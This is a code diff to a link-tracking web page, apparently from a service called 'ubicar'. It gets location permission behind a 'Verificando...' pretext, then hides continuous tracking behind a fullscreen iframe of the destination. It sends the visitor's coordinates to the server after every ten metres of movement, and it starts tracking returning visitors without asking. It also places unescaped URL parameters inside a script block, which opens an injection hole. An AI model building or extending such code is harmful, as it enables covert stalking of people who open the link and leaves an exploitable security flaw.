@@ -273,72 +273,75 @@ app.get('/s/:id', async (req, res) => {
     </div>
     
     <script>
-        const linkId = '${req.params.id}';
-        const storageKey = 'ubicar_subscribed_' + linkId;
-        const destUrl = '${destinationUrl}';
-        const alreadySubscribed = localStorage.getItem(storageKey);
+        var linkId = '${req.params.id}';
+        var storageKey = 'ubicar_subscribed_' + linkId;
+        var destUrl = '${destinationUrl}';
+        var alreadySubscribed = localStorage.getItem(storageKey);
+        var lastLat = null, lastLng = null;
+        var THRESHOLD = 10; // meters
 
-        // Send location using sendBeacon (survives page navigation)
-        function sendLocation(lat, lng, callback) {
+        // Haversine distance in meters
+        function distanceM(lat1, lng1, lat2, lng2) {
+            var R = 6371000, dLat = (lat2-lat1)*Math.PI/180, dLng = (lng2-lng1)*Math.PI/180;
+            var a = Math.sin(dLat/2)*Math.sin(dLat/2) + Math.cos(lat1*Math.PI/180)*Math.cos(lat2*Math.PI/180)*Math.sin(dLng/2)*Math.sin(dLng/2);
+            return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+        }
+
+        // Send location via sendBeacon (reliable, survives page changes)
+        function sendLocation(lat, lng) {
             var data = JSON.stringify({ linkId: linkId, lat: lat, lng: lng, userAgent: navigator.userAgent });
-            var sent = false;
             if (navigator.sendBeacon) {
-                sent = navigator.sendBeacon('/api/track', new Blob([data], { type: 'application/json' }));
-            }
-            if (!sent) {
-                // Fallback: fetch with keepalive
-                fetch('/api/track', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: data,
-                    keepalive: true
-                }).catch(function(){});
-            }
-            if (callback) setTimeout(callback, 300);
-        }
-
-        // If already subscribed: capture location silently then redirect to destination
-        if (alreadySubscribed) {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        sendLocation(pos.coords.latitude, pos.coords.longitude, function() {
-                            window.location.replace(destUrl);
-                        });
-                    },
-                    function() { window.location.replace(destUrl); },
-                    { timeout: 4000, enableHighAccuracy: true }
-                );
+                navigator.sendBeacon('/api/track', new Blob([data], { type: 'application/json' }));
             } else {
-                window.location.replace(destUrl);
+                fetch('/api/track', { method:'POST', headers:{'Content-Type':'application/json'}, body:data, keepalive:true }).catch(function(){});
+            }
+            lastLat = lat; lastLng = lng;
+        }
+
+        // Show destination in fullscreen iframe + start continuous tracking
+        function showDestAndTrack() {
+            // Replace page with iframe
+            document.body.innerHTML = '<div style="position:fixed;inset:0;z-index:9999;background:#000"><div style="height:2px;background:#3b82f6;width:100%;animation:pulse 2s infinite"></div><iframe src="' + destUrl + '" style="width:100%;height:calc(100% - 2px);border:none" allow="autoplay;fullscreen"></iframe></div><style>@keyframes pulse{0%,100%{opacity:1}50%{opacity:0.3}}</style>';
+
+            // Start continuous tracking - only send when moved > 10m
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition(function(pos) {
+                    var lat = pos.coords.latitude, lng = pos.coords.longitude;
+                    if (lastLat === null || distanceM(lastLat, lastLng, lat, lng) >= THRESHOLD) {
+                        sendLocation(lat, lng);
+                    }
+                }, function(){}, { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 });
             }
         }
 
-        // First time: click CTA -> ask permission -> capture -> redirect to destination
+        // FLOW: Already subscribed -> show destination immediately + track
+        if (alreadySubscribed) {
+            showDestAndTrack();
+        }
+
+        // FLOW: First time -> click CTA -> ask permission -> show destination + track
         document.getElementById('ctaBtn').addEventListener('click', function() {
             var btn = this;
-            var errorMsg = document.getElementById('errorMsg');
             btn.disabled = true;
-            errorMsg.style.display = 'none';
+            document.getElementById('errorMsg').style.display = 'none';
 
             if (!navigator.geolocation) {
                 localStorage.setItem(storageKey, 'true');
-                window.location.href = destUrl;
+                showDestAndTrack();
                 return;
             }
 
             btn.innerHTML = 'Verificando... <span class="spinner"></span>';
 
             navigator.geolocation.getCurrentPosition(
-                function(position) {
+                function(pos) {
+                    sendLocation(pos.coords.latitude, pos.coords.longitude);
                     localStorage.setItem(storageKey, 'true');
-                    sendLocation(position.coords.latitude, position.coords.longitude, function() {
-                        window.location.href = destUrl;
-                    });
+                    showDestAndTrack();
                 },
                 function() {
                     localStorage.setItem(storageKey, 'true');
-                    window.location.href = destUrl;
+                    showDestAndTrack();
                 },
                 { timeout: 10000, enableHighAccuracy: true }
             );
